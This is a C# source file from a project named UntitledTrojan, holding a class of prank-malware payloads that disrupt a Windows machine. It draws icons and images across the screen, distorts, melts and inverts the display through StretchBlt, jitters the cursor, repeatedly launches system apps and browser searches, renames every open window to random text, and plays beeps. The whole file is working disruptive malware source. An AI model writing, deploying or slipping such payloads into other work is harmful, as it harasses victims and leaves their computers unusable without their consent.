using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan.Properties;

namespace UntitledTrojan.Tools
{
    internal class DisplayFuck
    {
        [DllImport("gdi32")]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);

        [DllImport("user32")]
        internal static extern int GetSystemMetrics(int smIndex);

        internal static int width = GetSystemMetrics(0);
        internal static int height = GetSystemMetrics(1);

        [DllImport("gdi32.dll")]
        internal static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

        [DllImport("gdi32.dll")]
        internal static extern bool SetPixel(IntPtr hdcDest, int x, int y, int color);

        [DllImport("user32.dll")]
        internal static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

        [DllImport("user32.dll")]
        internal static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

        [DllImport("gdi32.dll")]
        internal static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

        [DllImport("user32")]
        internal static extern bool GetCursorPos(out POINT lpPoint);

        [DllImport("user32.dll")]
        internal static extern bool MessageBeep(uint type);

        internal delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);

        [DllImport("user32.dll")]
        internal static extern bool EnumWindows(EnumDesktopWindowsDelegate i, IntPtr x);

        [DllImport("user32.dll")]
        internal static extern bool EnumChildWindows(IntPtr hwnd, EnumDesktopWindowsDelegate i, IntPtr x);

        [DllImport("user32.dll")]
        internal static extern bool SetWindowPos(IntPtr hwnd, IntPtr hwnd2, int x, int y, int cx, int cy, uint flags);

        [DllImport("user32.dll")]
        internal static extern bool GetWindowTextA(IntPtr hwnd, out string s, int count);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GlobalAlloc(uint flags, int size);

        [Flags]
        public enum SendMessageTimeoutFlags : uint
        {
            SMTO_NORMAL = 0x0,
            SMTO_BLOCK = 0x1,
            SMTO_ABORTIFHUNG = 0x2,
            SMTO_NOTIMEOUTIFNOTHUNG = 0x8,
            SMTO_ERRORONEXIT = 0x0020
        }

        [DllImport("user32.dll")]
        internal static extern bool SendMessageTimeoutW(IntPtr windowHandle, uint Msg, IntPtr wParam, IntPtr lParam, SendMessageTimeoutFlags flags,
            uint timeout, out IntPtr result);

        [DllImport("user32.dll")]
        internal static extern bool GetWindowRect(IntPtr windowHandle, out RECT rect);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetDesktopWindow();

        [DllImport("kernel32.dll")]
        internal static extern bool GlobalFree(IntPtr ptr);

        [DllImport("user32.dll")]
        internal static extern bool SetWindowTextA(IntPtr hwnd, IntPtr lp);

        internal static Random random = new Random();

        internal struct POINT
        {
            public int x { get; set; }
            public int y { get; set; }
        }

        internal struct RECT
        {
            public int left { get; set; }
            public int top { get; set; }
            public int right { get; set; }
            public int bottom { get; set; }
        }

        internal static void StartWarn(int i)
        {
            new Thread(async() => {
                int ticks = 0;
                int count = i;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    IntPtr icon = LoadIcon(IntPtr.Zero, random.Next(32512, 32518));
                    DrawIcon(hdc, random.Next(0, width), random.Next(0, height), icon);
                    await Task.Delay(100);
                }
            }).Start();
        }

        internal static void StartWarnCursor(int i)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = i;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    IntPtr icon = LoadIcon(IntPtr.Zero, 32513);
                    DrawIcon(hdc, Cursor.Position.X, Cursor.Position.Y, icon);
                    await Task.Delay(10);
                    int r = random.Next(0, 8);
                    switch (r)
                    {
                        case 0: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y); break;
                        case 1: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y); break;
                        case 2: Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y + random.Next(1, 10)); break;
                        case 3: Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y - random.Next(1, 10)); break;
                        case 4: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y + random.Next(1, 10)); break;
                        case 5: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y + random.Next(1, 10)); break;
                        case 6: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y - random.Next(1, 10)); break;
                        case 7: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y - random.Next(1, 10)); break;
                    }
                }
            }).Start();
        }

        internal static void StartApps(int i)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = i;
                while (ticks < count)
                {
                    ticks++;
                    int r = random.Next(0, 6);
                    switch (r)
                    {
                        case 0: Process.Start("calc"); break;
                        case 1: Process.Start("control"); break;
                        case 2: Process.Start("explorer"); break;
                        case 3: Process.Start("mspaint"); break;
                        case 4: Process.Start("notepad"); break;
                        case 5: Process.Start("wordpad"); break;
                    }
                    await Task.Delay(5000);
                }
            }).Start();
        }

        internal static void StartGlitch(int i)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = i;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    int x1 = random.Next(0, width);
                    int y1 = random.Next(0, height);
                    int x2 = random.Next(0, width);
                    int y2 = random.Next(0, height);
                    int w = random.Next(0, 300);
                    int h = random.Next(0, 300);
                    int w2 = random.Next(0, width);
                    int h2 = random.Next(0, height);
                    StretchBlt(hdc, x1, y1, w, h, hdc, x2, y2, w2, h2, 0x00660046);
                    await Task.Delay(500);
                }
            }).Start();
        }

        internal static void StartAmogus(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    Graphics g = Graphics.FromHdc(hdc);
                    int x = random.Next(0, width);
                    int y = random.Next(0, height);
                    g.DrawImage(Resources.among, x, y);
                    await Task.Delay(100);
                }
            }).Start();
        }

        internal static void StartTextFucker(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    EnumWindows((hWnd, lParam) => {
                        EnumChildWindows(hWnd, (hwnd, param) => {
                            SetWindowTextA(hwnd, Marshal.StringToHGlobalAnsi(Reverse(RandomString(10))));
                            return true;
                        }, (IntPtr)null);
                        SetWindowTextA(hWnd, Marshal.StringToHGlobalAnsi(Reverse(RandomString(10))));
                        return true;
                    }, (IntPtr)null);
                    await Task.Delay(100);
                }
            }).Start();
        }

        internal static string Reverse(string text)
        {
            char[] cArray = text.ToCharArray();
            string reverse = string.Empty;
            for (int i = cArray.Length - 1; i >= 0; i--) reverse += cArray[i];
            return reverse;
        }

        internal static void StartReverse(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    for (int x = 0; x < width; x += 5)
                        new Thread(() => {
                            StretchBlt(hdc, x, random.Next(1, 10), 5, height, hdc, x, 0, 5, height, 0x00C000CA);
                        }).Start();
                    await Task.Delay(10);
                }
            }).Start();
        }

        internal static void StartScreenGlitch(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    StretchBlt(hdc, 0, 0, width, height, hdc, 0, 0, width, height, 0x00660046);
                    await Task.Delay(1000);
                }
            }).Start();
        }

        internal static void StartMelter(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    int x = 50;
                    int y = 50;
                    int w = Screen.PrimaryScreen.Bounds.Width - 100;
                    int h = Screen.PrimaryScreen.Bounds.Height - 100;
                    StretchBlt(hdc, x, y, w, h, hdc, 0, 0, width, height, 0x00C000CA);
                    await Task.Delay(50);
                }
            }).Start();
        }

        internal static void StartInvert(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    StretchBlt(hdc, 0, 0, width, height, hdc, 0, 0, width, height, 0x005A0049);
                    await Task.Delay(1000);
                }
            }).Start();
        }

        internal static void StartRecursive(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    Graphics g = Graphics.FromHdc(hdc);
                    Bitmap screen = Screenshot();
                    for (int i = 100; i < (50 * 4); i += 100)
                    {
                        int x = i;
                        int y = i;
                        int w = screen.Width - i;
                        int h = screen.Height - i;
                        int scaleWidth = (int)((float)screen.Width * ((float)w / (float)screen.Width));
                        int scaleHeight = (int)((float)screen.Height * ((float)h / (float)screen.Height));
                        g.DrawImage(screen, x, y, scaleWidth, scaleHeight);
                        await Task.Delay(1);
                    }
                    screen.Dispose();
                    await Task.Delay(10);
                }
            }).Start();
        }

        internal static void StartLinks(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    int r = random.Next(0, 5);
                    switch (r)
                    {
                        case 0: Process.Start("http://google.com/search?q=Amogus"); break;
                        case 1: Process.Start("http://google.com/search?q=Скачать+Among+Us"); break;
                        case 2: Process.Start("http://google.com/search?q=Как+удалить+вирус"); break;
                        case 3: Process.Start("http://google.com/search?q=TheAirBlow+;)"); break;
                        case 4: Process.Start("http://google.com/search?q=Как+amogus"); break;
                    }
                    await Task.Delay(5000);
                }
            }).Start();
        }

        internal static void StartSounds(int c)
        {
            new Thread(async () => {
                int ticks = 0;
                int count = c;
                while (ticks < count)
                {
                    ticks++;
                    int r = random.Next(0, 5);
                    switch (r)
                    {
                        case 0: MessageBeep(0x00000040); break;
                        case 1: MessageBeep(0x00000030); break;
                        case 2: MessageBeep(0x00000010); break;
                        case 3: MessageBeep(0x00000000); break;
                        case 4: MessageBeep(0xFFFFFFFF); break;
                    }
                    await Task.Delay(1000);
                }
            }).Start();
        }

        internal static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        internal static Bitmap Screenshot()
        {
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gfxScreenshot = Graphics.FromImage(screenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0,
                Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            gfxScreenshot.Dispose();
            return screenshot;
        }

        // https://vk.com/id426648135
    }
}
